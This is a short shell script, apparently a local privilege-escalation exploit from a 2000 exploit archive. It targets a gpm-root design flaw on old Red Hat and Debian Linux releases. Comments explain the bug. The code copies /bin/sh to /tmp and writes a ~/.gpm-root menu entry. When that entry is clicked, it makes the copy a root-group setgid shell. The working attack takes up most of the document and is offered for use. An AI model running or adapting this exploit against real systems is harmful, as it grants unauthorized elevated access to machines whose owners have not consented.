#!/bin/sh
#
# A vulnerability exists in the gpm-root program, part of
# the gpm package. This package is used to enable mice on
# the consoles of many popular Linux distributions. The
# problem is a design error, caused when a programmer chose
# to attempt to revert to the running users groups, after
# having called setuid to the users id already. The setgid
# call fails, and the process maintains the groups the
# gpm-root program is running as.
# This is usually the 'root' group.
#
# This vulnerability requires the user have console access.
#
#  RedHat Linux (6.2 / 6.1 / 6.0 / 6.0 / 5.2 / 5.1)
#  Debian Linux (2.2 / 2.1 / 2.0)

cp /bin/sh /tmp

cat > ~/.gpm-root << EOF
button 1 {
  name "create a setgid shell"
  "setgid shell" f.bgcmd "chgrp root /tmp/sh; chmod 2755 /tmp/sh"
}
EOF

echo "click control-left mouse button, and click "setgid shell""
execute /tmp/sh
#                    www.hack.co.za              [2000]#